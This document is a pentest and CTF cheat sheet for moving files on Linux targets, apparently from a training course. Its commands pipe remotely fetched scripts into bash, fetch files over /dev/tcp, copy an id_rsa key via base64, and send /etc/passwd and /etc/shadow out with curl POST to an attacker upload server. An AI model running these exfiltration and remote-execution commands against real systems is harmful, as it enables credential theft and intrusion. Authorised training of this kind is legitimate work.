## Overview

During CTFs and pentests, file transfer is often needed for:

- downloading tools to a target
- exfiltrating interesting files
- transferring loot securely
- operating without common transfer utilities
- reducing on-disk artifacts

Choice of method depends on:

- available binaries
- inbound/outbound network access
- opsec requirements
- file size
- encryption requirements

---

## Quick Workflow

1. check available tools on target
2. determine allowed network paths
3. choose lowest-friction transfer method
4. verify file integrity
5. clean up temporary files if needed

---

# 1. Base64 Encode / Decode

## Use Case

Useful when:

- network transfer is not possible
- file is small
- terminal copy/paste is available

Good for:
- keys
- configs
- scripts
- short text files

---

## Check File Hash First

```bash
md5sum id_rsa
```

Example output:

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

---

## Encode File to Base64

```bash
cat id_rsa | base64 -w 0; echo
```

Notes:

- `-w 0` forces single-line output
- `echo` adds a newline to make copying easier

---

## Decode on Target

```bash
echo -n 'BASE64_BLOB' | base64 -d > id_rsa
```

---

## Verify Integrity

```bash
md5sum id_rsa
```

Compare hash with original.

---

## Reverse Operation

To upload from target to attacker:

1. `cat file | base64 -w 0`
2. copy output
3. decode on Pwnbox

---

# 2. Download with wget

## Download File to Disk

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Notes:

- `-O` sets output filename
- common and reliable if installed

---

# 3. Download with cURL

## Download File to Disk

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Notes:

- `-o` is lowercase
- equivalent to `wget -O`

---

# 4. Fileless Execution

## Overview

Useful when you want to:

- avoid saving files to disk
- execute scripts directly
- reduce artifacts

⚠️ Some payloads may still create temporary files depending on what they do internally.

---

## Fileless Execution with cURL

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

---

## Fileless Execution with wget

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

Example output:

```text
Hello World!
```

Notes:

- `-qO-` makes wget write content to stdout
- pipe into interpreter directly

---

# 5. Download with Bash (/dev/tcp)

## Use Case

Useful when:

- `wget` is missing
- `curl` is missing
- Bash supports `/dev/tcp`

Requires:
- Bash 2.04+ with `--enable-net-redirections`

---

## Connect to Web Server

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

---

## Send HTTP GET Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

---

## Print Response

```bash
cat <&3
```

Notes:

- crude but effective
- useful as a last-resort transfer method

---

# 6. File Transfers with SCP

## Overview

SCP uses SSH for secure file transfer.

Useful when:

- SSH outbound/inbound is allowed
- credentials are available
- encrypted transfer is preferred

---

## Enable SSH Server on Pwnbox

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

---

## Check SSH Listening Port

```bash
netstat -lnpt
```

Look for:

```text
0.0.0.0:22
```

---

## Download File from Remote Host

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

Notes:

- syntax is similar to `cp`
- remote path is `user@host:/path`

---

## Upload File to Target

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

Notes:

- useful when outbound SSH is allowed from target
- avoid using primary credentials where possible

---

# 7. Upload via HTTPS Web Server

## Overview

Useful when you want the compromised machine to **POST** files back to your attacker host.

Can be done securely with a self-signed certificate.

---

## Install uploadserver

```bash
sudo python3 -m pip install --user uploadserver
```

---

## Create Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

## Start HTTPS Upload Server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload page will be available at:

```text
https://ATTACKER_IP/upload
```

---

## Upload Files from Target

```bash
curl -X POST https://192.168.49.128/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure
```

Notes:

- `--insecure` is needed for self-signed certs
- very useful for exfiltrating multiple files quickly

---

# 8. Ad-Hoc Web Servers on Linux

## Overview

If the target has Python, PHP, or Ruby, you can quickly expose files over HTTP.

Useful when:

- you want to download files from target to attacker
- inbound access to target is allowed
- you need a quick temporary webroot

⚠️ This is serving files from the compromised host. You are then downloading them from your attacker machine.

---

## Python 3 Web Server

```bash
python3 -m http.server
```

---

## Python 2 Web Server

```bash
python2.7 -m SimpleHTTPServer
```

---

## PHP Web Server

```bash
php -S 0.0.0.0:8000
```

---

## Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

---

## Download File from Target

```bash
wget http://192.168.49.128:8000/filetotransfer.txt
```

Notes:

- inbound traffic to target must be allowed
- good fallback when SCP is unavailable

---

# Integrity Checking

Always verify important transferred files.

## MD5

```bash
md5sum file
```

You can also use:

## SHA256

```bash
sha256sum file
```

Prefer `sha256sum` where possible.

---

# When to Use What

| Method | Best For | Notes |
|--------|----------|------|
| Base64 | very small files | no network needed |
| wget | simple downloads | common binary |
| curl | simple downloads / POST uploads | very flexible |
| curl/wget pipe | fileless execution | reduced disk artifacts |
| /dev/tcp | minimal environments | Bash-dependent |
| SCP | secure transfers | requires SSH |
| uploadserver | exfil to attacker | useful for multiple files |
| Python/PHP/Ruby web server | serving local files | requires inbound access |

---

# Common OPSEC Notes

- fileless does not always mean artifact-free
- verify whether outbound traffic is allowed
- verify whether inbound traffic to target is allowed
- avoid writing sensitive tools to obvious locations when possible
- use temporary accounts for SCP if feasible
- clean up uploaded tools after use
- hash important files before and after transfer

# Cheatsheet

## Base64

```bash
# encode
cat file | base64 -w 0; echo

# decode
echo -n 'BASE64_BLOB' | base64 -d > file

# verify
md5sum file
```

## wget / curl

```bash
wget URL -O /tmp/file
curl -o /tmp/file URL
```

## Fileless

```bash
curl URL | bash
wget -qO- URL | python3
```

## /dev/tcp

```bash
exec 3<>/dev/tcp/ATTACKER_IP/80
echo -e "GET /file HTTP/1.1\n\n" >&3
cat <&3
```

## SCP

```bash
# download from remote
scp user@host:/path/to/file .

# upload to remote
scp file user@host:/path/
```

## Upload Server

```bash
# attacker
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
# target
curl -X POST https://ATTACKER_IP/upload -F 'files=@/path/to/file' --insecure
```

## Quick Web Servers

```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```
